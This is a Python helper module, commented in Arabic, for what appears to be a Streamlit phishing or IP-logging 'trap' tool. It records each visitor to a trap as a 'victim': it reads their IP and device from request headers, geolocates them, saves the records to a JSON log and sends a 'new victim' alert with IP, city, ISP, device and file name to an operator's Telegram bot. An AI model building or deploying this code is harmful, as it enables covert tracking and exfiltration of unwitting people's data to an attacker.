"""
ملف المساعدات الموحد - يحتوي على جميع الدوال المساعدة الموحدة
"""

import os
import json
import requests
import streamlit as st
from datetime import datetime
import config
import logging

# إعداد السجل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============= دوال Telegram الموحدة =============

def sanitize_text(text):
    """تطهير نص رسالة تلجرام من الرموز غير الصالحة"""
    try:
        # تنظيف النص باستخدام UTF-8 مع تجاهل الأخطاء
        if isinstance(text, str):
            return text.encode('utf-8', 'ignore').decode('utf-8', 'ignore')
        return str(text).encode('utf-8', 'ignore').decode('utf-8', 'ignore')
    except Exception as e:
        logger.debug(f"Error sanitizing text: {e}")
        return "[Error in message]"

def send_telegram_alert(ip, trap_name, device="Unknown", file_name=""):
    """إرسال تنبيه إلى Telegram عند اكتشاف ضحية أو تحميل ملف"""
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    
    if not token or not chat_id:
        logger.warning("Telegram credentials not configured")
        return False
        
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {
                "country": res.get("country", "Unknown"),
                "city": res.get("city", "Unknown"),
                "isp": res.get("isp", "Unknown")
            }
    except Exception as e:
        logger.error(f"Error fetching geo data: {e}")

    file_info = f"📄 الملف: {file_name}" if file_name else ""
    message = f"""
🎯 تنبيه: تم اكتشاف ضحية جديدة!

📄 عنوان IP: {ip}
🌐 الدولة: {geo_data['country']}
🏙️ المدينة: {geo_data['city']}
🏒 مزود الخدمة: {geo_data['isp']}
📱 الجهاز: {device}
🎯 المصيدة: {trap_name}
{file_info}
⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    # تطهير الرسالة قبل الإرسال
    message = sanitize_text(message)
    
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat_id, "text": message, "parse_mode": "HTML"},
            timeout=10
        )
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Error sending Telegram alert: {sanitize_text(str(e))}")
        return False

# ============= دوال تسجيل الضحايا الموحدة =============

def log_victim(ip, country, city, isp, device, trap_name):
    """تسجيل بيانات الضحية في ملف JSON"""
    victims_file = config.VICTIMS_FILE_PATH
    victim_data = {
        "ip": ip,
        "country": country,
        "city": city,
        "isp": isp,
        "device": device,
        "trap_name": trap_name,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        if os.path.exists(victims_file):
            with open(victims_file, "r", encoding="utf-8") as f:
                data = json.load(f)
        else:
            data = []
        data.append(victim_data)
        with open(victims_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except Exception as e:
        logger.error(f"Error logging victim: {e}")
        return False

def get_all_victims():
    """الحصول على جميع الضحايا المسجلين"""
    victims_file = config.VICTIMS_FILE_PATH
    try:
        if os.path.exists(victims_file):
            with open(victims_file, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error reading victims: {e}")
    return []

def clear_victims_log():
    """مسح سجل الضحايا"""
    victims_file = config.VICTIMS_FILE_PATH
    try:
        if os.path.exists(victims_file):
            with open(victims_file, "w", encoding="utf-8") as f:
                json.dump([], f)
        return True
    except Exception as e:
        logger.error(f"Error clearing victims log: {e}")
        return False

# ============= دوال الحصول على معلومات العميل =============

def get_user_agent():
    """الحصول على User-Agent من رؤوس الطلب"""
    try:
        if hasattr(st, 'context') and hasattr(st.context, 'headers'):
            headers = st.context.headers
            if 'User-Agent' in headers:
                return headers['User-Agent']
    except:
        pass
    return 'Unknown'

def detect_device_from_user_agent(user_agent):
    """تحديث نوع الجهاز من User-Agent"""
    if not user_agent:
        return 'Unknown'
    
    user_agent_lower = user_agent.lower()
    
    if 'android' in user_agent_lower:
        return 'Android'
    elif 'iphone' in user_agent_lower or 'ipad' in user_agent_lower or 'ipod' in user_agent_lower:
        return 'iOS'
    elif 'windows' in user_agent_lower:
        return 'Windows'
    elif 'macintosh' in user_agent_lower or 'mac os' in user_agent_lower:
        return 'MacOS'
    elif 'linux' in user_agent_lower:
        return 'Linux'
    else:
        return 'Unknown'

# ============= دوال الحصول على IP =============

def get_server_side_ip():
    """جلب عنوان IP الحقيقي من رؤوس الطلب"""
    try:
        if hasattr(st, 'context') and hasattr(st.context, 'headers'):
            headers = st.context.headers
            if "X-Forwarded-For" in headers:
                ip = headers["X-Forwarded-For"].split(",")[0].strip()
                if ip and ip != "127.0.0.1" and not ip.startswith("192.168"):
                    return ip
            if "X-Real-IP" in headers:
                ip = headers["X-Real-IP"].strip()
                if ip and ip != "127.0.0.1" and not ip.startswith("192.168"):
                    return ip
            if "CF-Connecting-IP" in headers:
                ip = headers["CF-Connecting-IP"].strip()
                if ip and ip != "127.0.0.1" and not ip.startswith("192.168"):
                    return ip
    except:
        pass
    
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=3)
        if response.status_code == 200:
            return response.json().get('ip', 'Unknown')
    except:
        pass
    
    return "Unknown"

def get_geo_data(ip):
    """الحصول على بيانات الموقع الجغرافي لعنوان IP باستخدام ipinfo.io"""
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    
    # محاولة الحصول على البيانات من ipinfo.io أولاً
    try:
        ipinfo_key = config.get_key("IPINFO_API_KEY")
        if ipinfo_key:
            headers = {"Authorization": f"Bearer {ipinfo_key}"}
            res = requests.get(f"https://ipinfo.io/{ip}", headers=headers, timeout=5).json()
            if res and "country" in res:
                geo_data = {
                    "country": res.get("country", "Unknown"),
                    "city": res.get("city", "Unknown"),
                    "isp": res.get("org", "Unknown").replace("AS", "").strip()
                }
                return geo_data
    except Exception as e:
        logger.debug(f"Error fetching from ipinfo.io: {e}")
    
    # احتياطي: استخدام ip-api.com
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {
                "country": res.get("country", "Unknown"),
                "city": res.get("city", "Unknown"),
                "isp": res.get("isp", "Unknown")
            }
    except Exception as e:
        logger.error(f"Error fetching geo data: {e}")
    return geo_data

# ============= دوال التحقق من الصحة =============

def validate_ip(ip):
    """التحقق من صحة عنوان IP"""
    import re
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    parts = ip.split('.')
    return all(0 <= int(part) <= 255 for part in parts)

def validate_domain(domain):
    """التحقق من صحة اسم الدومين"""
    import re
    pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))

def validate_email(email):
    """التحقق من صحة البريد الإلكتروني"""
    import re
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))

def validate_phone(phone):
    """التحقق من صحة رقم الهاتف"""
    import re
    # إزالة المسافات والشرطات والعلامات الأخرى
    clean_phone = re.sub(r'\D', '', phone)
    return len(clean_phone) >= 10

# ============= دوال معالجة الأخطاء =============

def safe_request(url, method="GET", timeout=5, **kwargs):
    """إجراء طلب آمن مع معالجة الأخطاء"""
    try:
        if method.upper() == "GET":
            response = requests.get(url, timeout=timeout, **kwargs)
        elif method.upper() == "POST":
            response = requests.post(url, timeout=timeout, **kwargs)
        else:
            return None, f"Unsupported method: {method}"
        
        response.raise_for_status()
        return response, None
    except requests.exceptions.Timeout:
        return None, "Request timeout"
    except requests.exceptions.ConnectionError:
        return None, "Connection error"
    except requests.exceptions.HTTPError as e:
        return None, f"HTTP error: {e.response.status_code}"
    except Exception as e:
        return None, str(e)

# ============= دوال التنسيق =============

def format_json(data):
    """تنسيق البيانات كـ JSON"""
    try:
        return json.dumps(data, indent=2, ensure_ascii=False)
    except:
        return str(data)

def format_table(data):
    """تنسيق البيانات كجدول"""
    if isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict):
        import pandas as pd
        return pd.DataFrame(data)
    return data
